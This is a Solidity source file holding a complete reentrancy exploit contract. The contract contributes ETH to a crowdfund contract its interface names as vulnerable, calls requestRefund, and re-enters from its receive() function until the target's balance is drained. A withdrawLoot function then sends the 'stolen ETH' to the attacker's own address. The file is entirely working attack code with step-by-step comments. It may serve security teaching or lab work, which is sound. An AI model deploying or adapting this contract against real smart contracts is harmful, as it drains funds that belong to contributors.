// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Interface for the vulnerable crowdfund contract
interface ICrowdfundVulnerable {
    function contribute() external payable;
    function requestRefund() external;
}

contract RefundAttacker {
    // EOA that controls this attacker contract
    address payable public attacker;

    // Target vulnerable crowdfund contract
    ICrowdfundVulnerable public vulnerable;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    constructor(address _vulnerable) {
        attacker = payable(msg.sender);
        vulnerable = ICrowdfundVulnerable(_vulnerable);
    }

    // STEP 1: Attacker funds attacker contract (EOA -> this contract)
    function fundAttacker() external payable onlyAttacker {
        // ETH stays in this contract
    }

    // STEP 2: Contribute contract balance into the crowdfund
    function contributeFromContract(uint256 amount) external onlyAttacker {
        require(
            address(this).balance >= amount,
            "Insufficient attacker contract balance"
        );

        // send 'amount' from this contract into the vulnerable crowdfund
        vulnerable.contribute{value: amount}();
    }

    // STEP 3: Trigger reentrancy (no ETH sent here)
    function runAttack() external onlyAttacker {
        vulnerable.requestRefund();
    }

    // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
    receive() external payable {
        if (address(vulnerable).balance > 0) {
            vulnerable.requestRefund();
        }
    }

    // STEP 5: Withdraw stolen ETH from attacker contract to attacker EOA
    function withdrawLoot() external onlyAttacker {
        uint256 bal = address(this).balance;
        require(bal > 0, "No loot");
        attacker.transfer(bal);
    }
}
